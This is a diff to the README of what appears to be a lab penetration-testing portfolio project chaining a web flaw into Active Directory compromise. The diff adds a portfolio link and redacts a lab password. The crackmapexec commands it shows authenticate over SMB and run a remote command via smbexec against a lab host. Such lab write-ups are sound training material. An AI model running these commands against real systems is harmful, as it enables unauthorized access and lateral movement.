@@ -2,6 +2,8 @@
 
 This project simulates a real-world intrusion from a vulnerable web application to full domain compromise.
 
+> Portfolio brief: [PORTFOLIO.zh-TW.md](PORTFOLIO.zh-TW.md)
+
 # Summary
 
 This project demonstrates how a single web vulnerability can be chained into a full Active Directory compromise.
@@ -95,13 +97,13 @@ SMB authentication
 ## Command
 
 ```bash
-crackmapexec smb 192.168.203.132 -u svc-sql -p 'Password123' -d lab
+crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab
 ```
 
 ## Result
 
 ```text
-lab\svc-sql:Password123 (Pwn3d!)
+lab\svc-sql:<REDACTED> (Pwn3d!)
 ```
 
 # Internal Pivot
@@ -113,7 +115,7 @@ Dual-homed workstation bridges networks.
 ## Command
 
 ```bash
-crackmapexec smb 192.168.203.132 -u svc-sql -p 'Password123' -d lab --exec-method smbexec -x whoami
+crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab --exec-method smbexec -x whoami
 ```
 
 ## Result
